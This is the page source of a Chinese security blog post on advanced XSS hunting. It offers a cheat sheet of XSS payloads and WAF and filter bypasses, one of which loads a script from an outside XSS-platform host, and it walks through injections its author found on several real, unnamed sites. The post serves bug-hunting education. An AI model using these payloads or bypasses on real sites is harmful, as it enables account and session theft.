@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>XSS漏洞挖掘-进阶 - B1gd0g</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="https://spring.io/images/favicon-9d25009f65637a49ac8d91eb1cf7b75e.ico" type="image/x-icon" />
+    <meta name="description" content="前言如果你还对XSS有些陌生，可以仔细看一看">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS漏洞挖掘-进阶">
+<meta property="og:url" content="https://b1gd0g.github.io/2021/02/21/xss%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:site_name" content="B1gd0g">
+<meta property="og:description" content="前言如果你还对XSS有些陌生，可以仔细看一看">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235859.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235904.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235909.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235913.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235919.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235924.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235927.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235931.jpeg">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235953.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235956.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000000.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000003.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000008.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000012.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000018.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000025.png">
+<meta property="og:image" content="https://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/XSS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E8%BF%9B%E9%98%B6/1568166049249.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_14,text_QnJva2VuXzU=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000030.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000035.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000038.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000043.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000048.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000054.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000059.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000104.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000107.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000111.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000114.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000118.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000122.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000125.png">
+<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000128.png">
+<meta property="article:published_time" content="2021-02-20T16:08:52.000Z">
+<meta property="article:modified_time" content="2022-09-30T03:35:03.280Z">
+<meta property="article:author" content="B1gd0g">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235859.png">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1665474214485">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1665474214485">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210111542873.png)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="B1gd0g" class="mdui-btn mdui-btn-icon"><img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="B1gd0g">
+            <img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g" alt="B1gd0g">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>15</div>
+        <div><span>标签</span>12</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%AF%94.html" title="杀软对比">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                杀软对比
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E7%A4%BE%E5%B7%A5%E5%AF%86%E7%A0%81.html" title="社工密码">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                社工密码
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E5%AF%BC%E8%88%AA.html" title="我的导航">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                我的导航
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <!-- 一言 -->
+<div class="nexmoe-widget-wrap">
+  <h3 class="nexmoe-widget-title">
+    一言
+  </h3>
+  <div class="nexmoe-widget">
+    <ul class="hitokoto-box">
+      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
+        <a href="#" id="hitokoto_text">
+          
+        </a>
+        <a href="#" id="hitokoto_error_text" style="display: none;">
+          
+        </a>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<script>
+  let hitokotoText = document.getElementById('hitokoto_text')
+  let hitokotoErroText = document.getElementById('hitokoto_error_text')
+  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
+  window.onload = function () {
+    let url = 'https://v1.hitokoto.cn'
+    if (hitokotoCategory) {
+      url += '?c=' + hitokotoCategory
+    }
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
+        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      })
+      .catch((reason) => {
+        console.error(11, reason)
+        hitokotoText.style.display = 'none'
+        hitokotoErroText.style.display = 'block'
+      })
+  }
+</script>
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/tools/">tools</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/安全小记/">安全小记</a>
+          <span class="category-list-count">10</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/Html/" style="font-size: 10px;">Html</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 10px;">钓鱼</a>
+    </div>
+    
+  </div>
+
+    
+        
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2022 B1gd0g
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
+            <img src="https://img-blog.csdnimg.cn/933c5936293c45309696a3318a633ad2.png" alt="XSS漏洞挖掘-进阶" loading="lazy">
+            <h1>XSS漏洞挖掘-进阶</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2021年02月21日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/%E5%AE%89%E5%85%A8%E5%B0%8F%E8%AE%B0/">安全小记</a>
+        
+        
+    <a><i class="nexmoefont icon-areachart"></i>约2k字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要8分钟</a>
+
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如果你还对<code>XSS</code>有些陌生，可以仔细看一看</p>
+<a id="more"></a>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4067">XSS总结 - 先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-I/#Encode">Web安全从零开始-XSS I - Zedd’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html">那些年我们一起学XSS</a>#最后一篇文章是精髓</p>
+<h2 id="常用的Payload"><a href="#常用的Payload" class="headerlink" title="常用的Payload"></a>常用的Payload</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(1)&lt;/script&gt;<br>&lt;script src=https://xsspt.com/VBAhTu&gt;&lt;/script&gt;<br>&lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;<br>&lt;svg onload=alert(1)&gt;<br>&lt;img src=1 onerror=alert(1)&gt;<br>&lt;img src=https://www.baidu.com/img/bd_logo1.png onload=alert(1)&gt;<br>&lt;details open ontoggle=alert(1)&gt;<br>&lt;body onload=alert(1)&gt;<br>&lt;M onmouseover=alert(1)&gt;M<br>&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;<br>&lt;iframe onload=alert(1)&gt;<br>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> onfocus=alert(1)&gt;<br>&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> onclick=alert(1)&gt;<br>&lt;form&gt;&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> formaction=javascript:alert(1)&gt;<br>&lt;!-- 上面这些都是比较常用的，那些不常用的我就没写 --&gt;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="Bypass的一些姿势"><a href="#Bypass的一些姿势" class="headerlink" title="Bypass的一些姿势"></a>Bypass的一些姿势</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- 空格被过滤 --&gt;<br>&lt;img/src=<span class="hljs-string">&quot;1&quot;</span>/onerror=alert(1)&gt;<br>    <br>&lt;!-- 双写绕过 --&gt;<br>&lt;iimgmg src=1 oonerrornerror=aimglert(1)&gt;<br><br>&lt;!-- 大小写绕过  --&gt;<br>&lt;iMg src=1 oNerRor=alert(1)&gt;<br><br>&lt;!-- 利用<span class="hljs-built_in">eval</span>() --&gt;<br>&lt;img src=1 onerror=<span class="hljs-string">&quot;a=`aler`;b=`t(1)`;eval(a+b);&quot;</span>&gt;<br>&lt;img src=1 onerror=<span class="hljs-built_in">eval</span>(atob(<span class="hljs-string">&#x27;YWxlcnQoMSk=&#x27;</span>))&gt;<br>    <br>&lt;!-- 利用location --&gt;<br>&lt;img src=1 onerror=location=<span class="hljs-string">&#x27;javascript:%61%6C%65%72%74%28%31%29&#x27;</span>&gt;<br>&lt;img src=1 onerror=location=<span class="hljs-string">&#x27;javascript:\x61\x6C\x65\x72\x74\x28\x31\x29&#x27;</span>&gt;<br>&lt;img src=1 onerror=location=<span class="hljs-string">&quot;javascr&quot;</span>+<span class="hljs-string">&quot;ipt:&quot;</span>+<span class="hljs-string">&quot;%61%6C%65%72%74%28%31%29&quot;</span>&gt;<br>    <br>&lt;!-- 括号被过滤 --&gt;<br>&lt;img src=1 onerror=<span class="hljs-string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;<br>    <br>&lt;!-- onerror=被过滤 --&gt;<br>&lt;img src=1 onerror     =alert(1)&gt;<br>&lt;img src=1 onerror<br>=alert(1)&gt;<br>    <br>&lt;!-- 属性被转换为大写 --&gt;<br>&lt;img src=1 onerror=&amp;<span class="hljs-comment">#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;&gt;</span><br>    <br>&lt;!-- 编码后被检测 --&gt;<br>&lt;img src=1 onerror=&amp;<span class="hljs-comment">#x00000061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;&gt;</span><br><br>&lt;!-- 上面的绕过是比较常见的姿势了，下面将结合实例讲XSS的绕过&gt;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="XSS实例及挖掘方法"><a href="#XSS实例及挖掘方法" class="headerlink" title="XSS实例及挖掘方法"></a>XSS实例及挖掘方法</h2><h3 id="1-1-某租号平台的三个XSS"><a href="#1-1-某租号平台的三个XSS" class="headerlink" title="1.1 某租号平台的三个XSS"></a>1.1 某租号平台的三个XSS</h3><p>首先租号平台肯定有一个发布账号的功能，发布账号就要涉及到用户输入，所以<code>XSS</code>出现的机率很大，来看看第一个实例。</p>
+<p>发布账号后，发现<code>&lt;&gt;&quot;&amp;</code>都被转义了，以及<code>&amp;</code>被替换被空，大部分人遇到这种的肯定都会放弃，但是它这里有一点没有处理好</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235859.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>它封面可以设置多张图片，多张图片的链接用<code>|</code>来分割，我在图片链接当中加了个单引号，没想到这个单引号居然能逃逸双引号的束缚，见下图</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235904.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>接下来就可以利用<code>onload</code>构造<code>payloade</code>就好了</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235909.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>第二个实例和第一个实例完全是一模一样，这个租号平台有个手机客户端，在手机客户端中也有一个发布账号的功能，由于后台处理是一样的，所以就多找到一个<code>XSS</code>，这也是漏洞挖掘的一个思路吧</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235913.png" alt="image" data-caption="image" loading="lazy"></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235919.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>第三个实例也是手机客户端上的（感觉目前APP的<code>XSS</code>防御较弱），一个发布动态的功能，同样动态内容中的标签都会被转义了，但是可以插入图片，能插入图片的地方<code>XSS</code>一般是比较多的</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235924.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>由于它没有对双引号进行转义，所以在引入图片链接的时候，输入双引号会闭合前面的双引号，所以就造成了<code>XSS</code></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235927.png" alt="image" data-caption="image" loading="lazy"></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235931.jpeg" alt="image" data-caption="image" loading="lazy"></p>
+<h3 id="1-2-某陪玩平台的一个XSS"><a href="#1-2-某陪玩平台的一个XSS" class="headerlink" title="1.2 某陪玩平台的一个XSS"></a>1.2 某陪玩平台的一个XSS</h3><p>也是从<code>APP</code>入手的，在一个修改地址的地方</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235953.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>修改之后，地址变为了<code>&lt;sc&lt;x&gt;ript&gt;</code>，并没有直接实体转义，还有机会</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235956.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>在之前对该站的测试中发现，服务器全局将<code>&#39;</code>和<code>&quot;</code>替换为空，所以可以利用这个特点来进行绕过</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000000.png" alt="image" data-caption="image" loading="lazy"></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000003.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>在网页可以看到<code>address</code>的回显</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000008.png" alt="image" data-caption="image" loading="lazy"></p>
+<h3 id="1-3-某酒店的一个反射XSS"><a href="#1-3-某酒店的一个反射XSS" class="headerlink" title="1.3 某酒店的一个反射XSS"></a>1.3 某酒店的一个反射XSS</h3><p>大部分人在<code>URL</code>中看到参数一般都是想着<code>SQL注入</code>吧，但还有可能是<code>反射XSS</code></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000012.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>由于前端并没有对双引号进行转义所以导致了<code>XSS</code></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000018.png" alt="image" data-caption="image" loading="lazy"></p>
+<h3 id="1-4-bilibili某论坛的一个XSS利用点"><a href="#1-4-bilibili某论坛的一个XSS利用点" class="headerlink" title="1.4 bilibili某论坛的一个XSS利用点"></a>1.4 bilibili某论坛的一个XSS利用点</h3><p>虽然最后没有利用好，但是思路还是不错的。先来讲讲思路，在该bilibili论坛，如果你第一次用bilibili账号登陆，他会将你bilibili的个性签名同步到该站，在这过程中它并没有讲bilibili中的个性签名做转义，所以如果利用的好应该能导致<code>XSS</code></p>
+<p>将bilibili的个签改成<code>&lt;img&gt;&lt;a&gt;123&lt;/a&gt;&lt;div&gt;&lt;/div&gt;&lt;svg&gt;&lt;/svg&gt;</code></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000025.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>用bilibili账号登陆目标站点后，会同步个性签名，bilibili还是在出口对标签做了过滤<code>&lt;svg&gt;</code>标签被转义，但是其它的标签并没有被转义</p>
+<p><img data-fancybox="gallery" src="https://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/XSS%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E8%BF%9B%E9%98%B6/1568166049249.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_14,text_QnJva2VuXzU=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="image" data-caption="image" loading="lazy"></p>
+<h3 id="1-5-某旅行网的一个XSS"><a href="#1-5-某旅行网的一个XSS" class="headerlink" title="1.5 某旅行网的一个XSS"></a>1.5 某旅行网的一个XSS</h3><p>在修改昵称处，可以输入任意字符</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000030.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>从返回结果来看，将<code>&lt;&gt;</code>变为空</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000035.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>之前<code>POST</code>的数据类似<code>json</code>格式，利用<code>\u003csvg\u003e</code>成功写入<code>&lt;svg&gt;</code>，猜测是服务器先对<code>POST</code>的内容进行检测，再格式化数据，所以使用<code>\u00xx</code>能成功绕过检测</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000038.png" alt="image" data-caption="image" loading="lazy"></p>
+<h3 id="1-6-APP数据接口中的XSS"><a href="#1-6-APP数据接口中的XSS" class="headerlink" title="1.6 APP数据接口中的XSS"></a>1.6 APP数据接口中的XSS</h3><p>一般这种<code>XSS</code>多出现在<code>APP</code>、<code>微信小程序</code>当中，其原理是，服务器未控制返回包中的<code>Content-Type</code>，导致本来是<code>JSON</code>格式的数据，会用默认的<code>html</code>来解析</p>
+<p>首先我发布了一条评论，评论的内容为<code>&lt;svg .....&gt;</code></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000043.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>接下来调用接口来查询发布的评论，可以发现返回的是<code>JSON</code>数据，而<code>Content-Type</code>却是<code>text/html</code>，导致浏览器会解析数据中的标签</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000048.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>而服务器后端使用的是<code>Request</code>来接收数据的，所以可以把<code>POST</code>换为<code>GET</code>，两个缺陷组合在一起也就导致了<code>XSS</code></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000054.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>对于这种<code>XSS</code>一般是有一个就有一串，如果返回的数据可控，那么每一个接口都可以是一个<code>XSS</code>的触发点</p>
+<h3 id="1-7-XSS绕WAF的两个实例"><a href="#1-7-XSS绕WAF的两个实例" class="headerlink" title="1.7 XSS绕WAF的两个实例"></a>1.7 XSS绕WAF的两个实例</h3><p>第一个例子，在查询框中由于没有对双引号进行转义所以存在<code>反射型XSS</code></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000059.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>多次测试后发现<code>onload、onclick、onfocus</code>等一些常用的属性都被<code>WAF</code>禁了</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000104.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>只能祭出我的绕<code>WAF</code>万能<code>payload &lt;details open ontoggle=testdemo&gt;</code></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000107.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>使用<code>ontoggle</code>属性能绕过<code>WAF</code>，但是属性的值被转换为大写了，之前说过使用<code>HTML实体编码</code>可以绕过</p>
+<p>将<code>alert(1)</code>转换为<code>HTML实体编码 alert(1)</code></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000111.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>转换编码后还是被检测了</p>
+<p>这种很好绕，只要将其中一个字符的<code>HTML编码改为&amp;#x00000xx</code>格式<code>WAF</code>就检测不出来了</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000114.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>第二个例子，跟第一个例子如出一辙，都是没有在输入框对双引号进行转义</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000118.png" alt="image" data-caption="image" loading="lazy"></p>
+<p><code>WAF</code>同样也是过滤了<code>onload onclick onfocus</code>等一些常用属性，这次连我的绕WAF万能<code>payload</code>都给过滤了</p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000122.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>没办法，那只能拿出我的第二个<code>payload &lt;input type=submit formaction=javascript:alert</code>1<code>&gt;</code></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000125.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>还是没有绕过去，因为<code>WAF</code>还过滤了<code>javascript:</code>跟第一个例子一样，使用<code>HTML实体编码</code>将<code>javascript:</code>转换为<code>javascript:</code></p>
+<p><img data-fancybox="gallery" src="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220222000128.png" alt="image" data-caption="image" loading="lazy"></p>
+<p><code>XSS</code>绕<code>WAF</code>的关键就是绕过被禁用的属性，平时可以去收集一点冷门的属性，只要绕过被禁用的属性，一般的<code>WAF</code>就拦不住你了</p>
